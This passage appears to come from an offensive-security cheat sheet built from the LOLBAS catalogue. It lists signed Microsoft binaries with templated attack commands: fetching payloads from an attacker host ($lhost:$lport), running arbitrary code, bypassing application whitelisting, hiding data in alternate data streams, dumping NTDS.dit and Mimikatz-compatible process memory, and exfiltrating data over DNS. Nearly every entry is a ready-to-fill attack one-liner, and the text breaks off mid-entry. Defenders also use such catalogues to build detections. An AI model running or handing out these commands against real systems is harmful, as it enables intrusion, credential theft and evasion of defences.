Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
ECMangen.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Excel.exe

Microsoft Office binary

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Excel.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Excel.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\Excel.exe`
- `C:\Program Files\Microsoft Office\Office16\Excel.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Excel.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Excel.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\Excel.exe`
- `C:\Program Files\Microsoft Office\Office15\Excel.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Excel.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Excel.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\Excel.exe`
- `C:\Program Files\Microsoft Office\Office14\Excel.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\Excel.exe`
- `C:\Program Files\Microsoft Office\Office12\Excel.exe`
- `C:\Program Files\Microsoft Office\Office12\Excel.exe`

### Excel.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
Excel.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Fsi.exe

64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.

**Path(s):**
- `C:\Program Files\dotnet\sdk\<version>\FSharp\fsi.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\IDE\CommonExtensions\Microsoft\FSharp\fsi.exe`

### Fsi.exe AWL Bypass #1

Execute F# code via script file

*Privileges: User • MITRE: T1059*

```cmd title:"Lolbas Execute F# code via script file"
fsi.exe $file_out
```
<!-- cheat
var file_out
-->

### Fsi.exe AWL Bypass #2

Execute F# code via interactive command line

*Privileges: User • MITRE: T1059*

```cmd title:"Lolbas Execute F# code via interactive command line"
fsi.exe
```
<!-- cheat
-->

## FsiAnyCpu.exe

32/64-bit FSharp (F#) Interpreter included with Visual Studio.

**Path(s):**
- `c:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\IDE\CommonExtensions\Microsoft\FSharp\fsianycpu.exe`

### FsiAnyCpu.exe AWL Bypass #1

Execute F# code via script file

*Privileges: User • MITRE: T1059*

```cmd title:"Lolbas Execute F# code via script file"
fsianycpu.exe $file_out
```
<!-- cheat
var file_out
-->

### FsiAnyCpu.exe AWL Bypass #2

Execute F# code via interactive command line

*Privileges: User • MITRE: T1059*

```cmd title:"Lolbas Execute F# code via interactive command line"
fsianycpu.exe
```
<!-- cheat
-->

## IntelliTrace.exe

Visual Studio command-line tool for collecting and managing diagnostic trace files.

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\IntelliTrace\IntelliTrace.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\IntelliTrace\IntelliTrace.exe`

### IntelliTrace.exe Execute

Launches an executable via Visual Studio command line utility.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launches an executable via Visual Studio command line utility"
IntelliTrace.exe launch /cp:"collectionplan.xml" /f:"c:\users\public\log" "C:\Windows\System32\calc.exe"
```
<!-- cheat
-->

## Logger.exe

A logging configuration tool from the Windows Kits used to start and manage process logging.

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\logger.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\logger.exe`
- `C:\Program Files\Windows Kits\10\Debuggers\x86\logger.exe`
- `C:\Program Files\Windows Kits\10\Debuggers\x64\logger.exe`

### Logger.exe Execute #1

Executes the command specified after the `RUN` parameter as a child of `logger.exe`.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes the command specified after the RUN parameter as a child of logger.exe"
logger.exe RUN "$cmd"
```
<!-- cheat
var cmd
-->

### Logger.exe Execute #2

Executes the command specified after the `RUNW` parameter as a child of `logger.exe`.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes the command specified after the RUNW parameter as a child of logger.exe"
logger.exe RUNW "$cmd"
```
<!-- cheat
var cmd
-->

### Logger.exe Execute #3

Executes the command specified as a child of `logger.exe`.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes the command specified as a child of logger.exe"
logger.exe "$cmd"
```
<!-- cheat
var cmd
-->

## Mftrace.exe

Trace log generation tool for Media Foundation Tools.

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x86\mftrace.exe`
- `C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64\mftrace.exe`
- `C:\Program Files (x86)\Windows Kits\10\bin\x86\mftrace.exe`
- `C:\Program Files (x86)\Windows Kits\10\bin\x64\mftrace.exe`

### Mftrace.exe Execute

Launch specified executable as a subprocess of Mftrace.exe.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launch specified executable as a subprocess of Mftrace.exe"
Mftrace.exe $file_out
```
<!-- cheat
var file_out
-->

## Microsoft.NodejsTools.PressAnyKey.exe

Part of the NodeJS Visual Studio tools.

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\Extensions\Microsoft\NodeJsTools\NodeJsTools\Microsoft.NodejsTools.PressAnyKey.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\Extensions\Microsoft\NodeJsTools\NodeJsTools\Microsoft.NodejsTools.PressAnyKey.exe`

### Microsoft.NodejsTools.PressAnyKey.exe Execute

Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe"
Microsoft.NodejsTools.PressAnyKey.exe normal 1 $file_out
```
<!-- cheat
var file_out
-->

## Mpiexec.exe

Command-line tool for running Message Passing Interface (MPI) applications.

**Path(s):**
- `C:\Program Files\Microsoft MPI\Bin\mpiexec.exe`
- `C:\Program Files (x86)\Microsoft MPI\Bin\mpiexec.exe`

### Mpiexec.exe Execute

Executes a command via MPI command-line tool.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Executes a command via MPI command-line tool"
mpiexec.exe $cmd
```
<!-- cheat
var cmd
-->

## MSAccess.exe

Microsoft Office component

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office16\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSAccess.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office15\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSAccess.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office14\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office12\MSAccess.exe`

### MSAccess.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
MSAccess.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Msdeploy.exe

Microsoft tool used to deploy Web Applications.

**Path(s):**
- `C:\Program Files\IIS\Microsoft Web Deploy V2\msdeploy.exe`
- `C:\Program Files (x86)\IIS\Microsoft Web Deploy V2\msdeploy.exe`
- `C:\Program Files\IIS\Microsoft Web Deploy V3\msdeploy.exe`
- `C:\Program Files (x86)\IIS\Microsoft Web Deploy V3\msdeploy.exe`
- `C:\Program Files\IIS\Microsoft Web Deploy V4\msdeploy.exe`
- `C:\Program Files (x86)\IIS\Microsoft Web Deploy V4\msdeploy.exe`
- `C:\Program Files\IIS\Microsoft Web Deploy V5\msdeploy.exe`
- `C:\Program Files (x86)\IIS\Microsoft Web Deploy V5\msdeploy.exe`

### Msdeploy.exe Execute #1

Launch .bat file via msdeploy.exe.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Launch .bat file via msdeploy.exe"
msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="$file_out"
```
<!-- cheat
var file_out
-->

### Msdeploy.exe AWL Bypass #2

Launch .bat file via msdeploy.exe.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Launch .bat file via msdeploy.exe"
msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="$file_out"
```
<!-- cheat
var file_out
-->

### Msdeploy.exe Copy #3

Copy file from source to destination.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copy file from source to destination"
msdeploy.exe -verb:sync -source:filePath=$file_out -dest:filePath=$file_out
```
<!-- cheat
var file_out
-->

## MsoHtmEd.exe

Microsoft Office component

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office16\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office15\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office14\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe`

### MsoHtmEd.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
MsoHtmEd.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Mspub.exe

Microsoft Publisher

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office16\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSPUB.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office15\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSPUB.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office14\MSPUB.exe`

### Mspub.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
mspub.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## msxsl.exe

Command line utility used to perform XSL transformations.

**Path(s):**
- `no default`

### msxsl.exe Execute #1

Run COM Scriptlet code within the script.xsl file (local).

*Privileges: User • MITRE: T1220*

```cmd title:"Lolbas Run COM Scriptlet code within the script.xsl file (local)"
msxsl.exe $file_out $file_out
```
<!-- cheat
var file_out
-->

### msxsl.exe AWL Bypass #2

Run COM Scriptlet code within the script.xsl file (local).

*Privileges: User • MITRE: T1220*

```cmd title:"Lolbas Run COM Scriptlet code within the script.xsl file (local)"
msxsl.exe $file_out $file_out
```
<!-- cheat
var file_out
-->

### msxsl.exe Execute #3

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

*Privileges: User • MITRE: T1220*

```cmd title:"Lolbas Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)"
msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### msxsl.exe AWL Bypass #4

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

*Privileges: User • MITRE: T1220*

```cmd title:"Lolbas Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)"
msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### msxsl.exe Download #5

Using remote XML and XSL files, save the transformed XML file to disk.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Using remote XML and XSL files, save the transformed XML file to disk"
msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file -o $file_out
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### msxsl.exe ADS #6

Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).

*Privileges: User • MITRE: T1564*

```cmd title:"Lolbas Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS)"
msxsl.exe $scheme://$lhost:$lport/$file $scheme://$lhost:$lport/$file -o $file_out:ads-name
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

## Nmcap.exe

Command-line packet capture utility from Microsoft Network Monitor 3.x.

**Path(s):**
- `C:\Program Files\Microsoft Network Monitor 3\nmcap.exe`
- `C:\Program Files (x86)\Microsoft Network Monitor 3\nmcap.exe`

### Nmcap.exe Reconnaissance

Start capture on all network adapters and save to specified .cap (circular) file. Optionally, one can add: - `/TerminateWhen /TimeAfter 30 seconds` to auto-terminate after a relative times (e.g. 30 seconds); - `/TerminateWhen /Time 04:52:00 AM 9/17/2025` to auto-terminate after a specific date/time; - `/TerminateWhen /KeyPress x` to terminate when a specific key is pressed.

*Privileges: Administrator • MITRE: T1040*

```cmd title:"Lolbas Start capture on all network adapters and save to specified .cap (circular) file"
nmcap.exe /network * /capture /file $file_out
```
<!-- cheat
var file_out
-->

## ntdsutil.exe

Command line utility used to export Active Directory.

**Path(s):**
- `C:\Windows\System32\ntdsutil.exe`

### ntdsutil.exe Dump

Dump NTDS.dit into folder

*Privileges: Administrator • MITRE: T1003.003*

```cmd title:"Lolbas Dump NTDS.dit into folder"
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
```
<!-- cheat
-->

## Ntsd.exe

Symbolic Debugger for Windows.

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\ntsd.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\ntsd.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\arm\ntsd.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\arm64\ntsd.exe`

### Ntsd.exe Execute

Launches command through the debugging process; optionally add `-G` to exit the debugger automatically.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launches command through the debugging process; optionally add -G to exit the debugger automatically"
ntsd.exe -g $cmd
```
<!-- cheat
var cmd
-->

## OpenConsole.exe

Console Window host for Windows Terminal

**Path(s):**
- `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\CommonExtensions\Microsoft\Terminal\ServiceHub\os64\OpenConsole.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\CommonExtensions\Microsoft\Terminal\ServiceHub\os86\OpenConsole.exe`
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\Terminal\ServiceHub\os64\OpenConsole.exe`
- `C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe`

### OpenConsole.exe Execute

Execute specified process with OpenConsole.exe as parent process

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute specified process with OpenConsole.exe as parent process"
OpenConsole.exe $file_out
```
<!-- cheat
var file_out
-->

## Pixtool.exe

Command line utility for taking and analyzing PIX GPU captures.

**Path(s):**
- `C:\Program Files\Microsoft PIX\pixtool.exe`
- `C:\Program Files (x86)\Microsoft PIX\pixtool.exe`

### Pixtool.exe Execute

Launches an executable via PIX command-line utility.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launches an executable via PIX command-line utility"
pixtool.exe launch $file_out
```
<!-- cheat
var file_out
-->

## Powerpnt.exe

Microsoft Office binary.

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office16\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Powerpnt.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office15\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Powerpnt.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office14\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office12\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office12\Powerpnt.exe`

### Powerpnt.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
Powerpnt.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Procdump.exe

SysInternals Memory Dump Tool

**Path(s):**
- `no default`

**Aliases:** `{'Alias': 'Procdump64.exe'}`

### Procdump.exe Execute #1

Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function"
procdump.exe -md $file_out explorer.exe
```
<!-- cheat
var file_out
-->

### Procdump.exe Execute #2

Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Procdump.exe Execute #2"
procdump.exe -md $file_out foobar
```
<!-- cheat
var file_out
-->

## ProtocolHandler.exe

Microsoft Office binary

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office\Office15\ProtocolHandler.exe`

### ProtocolHandler.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
ProtocolHandler.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## rcsi.exe

Non-Interactive command line inerface included with Visual Studio.

**Path(s):**
- `no default`

### rcsi.exe Execute #1

Use embedded C# within the csx script to execute the code.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Use embedded C# within the csx script to execute the code"
rcsi.exe $file_out
```
<!-- cheat
var file_out
-->

### rcsi.exe AWL Bypass #2

Use embedded C# within the csx script to execute the code.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Use embedded C# within the csx script to execute the code"
rcsi.exe $file_out
```
<!-- cheat
var file_out
-->

## Remote.exe

Debugging tool included with Windows Debugging Tools

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe`

### Remote.exe AWL Bypass #1

Spawns specified executable as a child process of remote.exe

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Spawns specified executable as a child process of remote.exe"
Remote.exe /s $file_out anythinghere
```
<!-- cheat
var file_out
-->

### Remote.exe Execute #2

Spawns specified executable as a child process of remote.exe

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Spawns specified executable as a child process of remote.exe"
Remote.exe /s $file_out anythinghere
```
<!-- cheat
var file_out
-->

### Remote.exe Execute #3

Run a remote file

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Run a remote file"
Remote.exe /s \\$lhost\$share\$file anythinghere
```
<!-- cheat
import tun_ip
var file
var share
-->

## Sqldumper.exe

Debugging utility included with Microsoft SQL.

**Path(s):**
- `C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe`
- `C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe`
- `C:\Program Files\Microsoft Power BI Desktop\bin\SqlDumper.exe`

### Sqldumper.exe Dump #1

Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).

*Privileges: Administrator • MITRE: T1003*

```cmd title:"Lolbas Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp)"
sqldumper.exe 464 0 0x0110
```
<!-- cheat
-->

### Sqldumper.exe Dump #2

0x01100:40 flag will create a Mimikatz compatible dump file.

*Privileges: Administrator • MITRE: T1003.001*

```cmd title:"Lolbas 0x01100:40 flag will create a Mimikatz compatible dump file"
sqldumper.exe 540 0 0x01100:40
```
<!-- cheat
-->

## Sqlps.exe

Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\100 and 110 are Powershell v2. Microsoft SQL Server\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.

**Path(s):**
- `C:\Program files (x86)\Microsoft SQL Server\100\Tools\Binn\sqlps.exe`
- `C:\Program files (x86)\Microsoft SQL Server\110\Tools\Binn\sqlps.exe`
- `C:\Program files (x86)\Microsoft SQL Server\120\Tools\Binn\sqlps.exe`
- `C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe`
- `C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\SQLPS.exe`

### Sqlps.exe Execute

Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging"
Sqlps.exe -noprofile
```
<!-- cheat
-->

## SQLToolsPS.exe

Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.

**Path(s):**
- `C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe`

### SQLToolsPS.exe Execute

Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging"
SQLToolsPS.exe -noprofile -command Start-Process $file_out
```
<!-- cheat
var file_out
-->

## Squirrel.exe

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

**Path(s):**
- `C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe`

### Squirrel.exe Download #1

The above binary will go to url and look for RELEASES file and download the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file and download the nuget package"
squirrel.exe --download $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Squirrel.exe AWL Bypass #2

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
squirrel.exe --update $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Squirrel.exe Execute #3

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
squirrel.exe --update $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Squirrel.exe AWL Bypass #4

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
squirrel.exe --updateRollback=$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Squirrel.exe Execute #5

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
squirrel.exe --updateRollback=$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## te.exe

Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).

**Path(s):**
- `no default`

### te.exe Execute #1

Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file"
te.exe $file_out
```
<!-- cheat
var file_out
-->

### te.exe Execute #2

Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests"
te.exe $file_out
```
<!-- cheat
var file_out
-->

## Teams.exe

Electron runtime binary which runs the Teams application

**Path(s):**
- `C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Teams.exe`

### Teams.exe Execute #1

Generate JavaScript payload and package.json, and save to "%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app\\" before executing.

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas Teams.exe Execute #1"
teams.exe
```
<!-- cheat
-->

### Teams.exe Execute #2

Generate JavaScript payload and package.json, archive in ASAR file and save to "%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app.asar" before executing.

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas Teams.exe Execute #2"
teams.exe
```
<!-- cheat
-->

### Teams.exe Execute #3

Teams spawns cmd.exe as a child process of teams.exe and executes the ping command

*Privileges: User • MITRE: T1218.015*

```cmd title:"Lolbas Teams spawns cmd.exe as a child process of teams.exe and executes the ping command"
teams.exe --disable-gpu-sandbox --gpu-launcher="$cmd &&"
```
<!-- cheat
var cmd
-->

## TestWindowRemoteAgent.exe

TestWindowRemoteAgent.exe is the command-line tool to establish RPC

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe`

### TestWindowRemoteAgent.exe Upload

Sends DNS query for open connection to any host, enabling exfiltration over DNS

*Privileges: User • MITRE: T1048*

```cmd title:"Lolbas Sends DNS query for open connection to any host, enabling exfiltration over DNS"
TestWindowRemoteAgent.exe start -h $your_base64_data.example.com -p 8000
```
<!-- cheat
var your_base64_data
-->

## Tracker.exe

Tool included with Microsoft .Net Framework.

**Path(s):**
- `no default`

### Tracker.exe Execute #1

Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Use tracker.exe to proxy execution of an arbitrary DLL into another process"
Tracker.exe /d $file_out /c C:\Windows\write.exe
```
<!-- cheat
var file_out
-->

### Tracker.exe AWL Bypass #2

Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Use tracker.exe to proxy execution of an arbitrary DLL into another process"
Tracker.exe /d $file_out /c C:\Windows\write.exe
```
<!-- cheat
var file_out
-->

## Update.exe

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

**Path(s):**
- `C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe`

### Update.exe Download #1

The above binary will go to url and look for RELEASES file and download the nuget package.

